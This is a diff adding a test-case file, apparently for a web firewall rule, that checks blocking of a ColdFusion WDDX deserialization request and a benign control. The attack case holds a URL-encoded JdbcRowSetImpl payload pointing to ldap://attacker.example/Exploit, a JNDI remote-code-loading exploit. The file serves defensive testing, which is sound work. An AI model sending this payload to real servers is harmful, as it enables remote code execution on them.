@@ -1,0 +1,35 @@
+[[case]]
+name = "wddx-rowset-jndi"
+kind = "attack"
+via = "request"
+
+[case.request]
+method = "POST"
+uri = "/CFIDE/adminapi/accessmanager.cfc"
+query = "method=foo&_cfclient=true&argumentCollection=%3CwddxPacket%20version%3D%271.0%27%3E%3Cheader/%3E%3Cdata%3E%3Cstruct%20type%3D%27xcom.sun.rowset.JdbcRowSetImplx%27%3E%3Cvar%20name%3D%27dataSourceName%27%3E%3Cstring%3Eldap%3A//attacker.example/Exploit%3C/string%3E%3C/var%3E%3Cvar%20name%3D%27autoCommit%27%3E%3Cboolean%20value%3D%27true%27/%3E%3C/var%3E%3C/struct%3E%3C/data%3E%3C/wddxPacket%3E"
+headers = { User-Agent = "Mozilla/5.0 (X11; Linux x86_64) Firefox/128.0", Accept = "text/html", Content-Type = "application/x-www-form-urlencoded" }
+
+[case.primary]
+effect = "block"
+rule = "request_typed_payload_deserialization"
+
+[case.backport]
+effect = "block"
+rule = "request_typed_payload_deserialization"
+
+[[case]]
+name = "benign-typed-safe-bean"
+kind = "benign"
+via = "request"
+
+[case.request]
+method = "POST"
+uri = "/CFIDE/adminapi/accessmanager.cfc"
+query = "method=foo&_cfclient=true&argumentCollection=%7B%22%40type%22%3A%22com.example.SafeBean%22%2C%22homepage%22%3A%22ldap%3A%2F%2Fexample.com%2Fdocs%22%7D"
+headers = { User-Agent = "Mozilla/5.0 (X11; Linux x86_64) Firefox/128.0", Accept = "text/html", Content-Type = "application/x-www-form-urlencoded" }
+
+[case.primary]
+effect = "none"
+
+[case.backport]
+effect = "none"
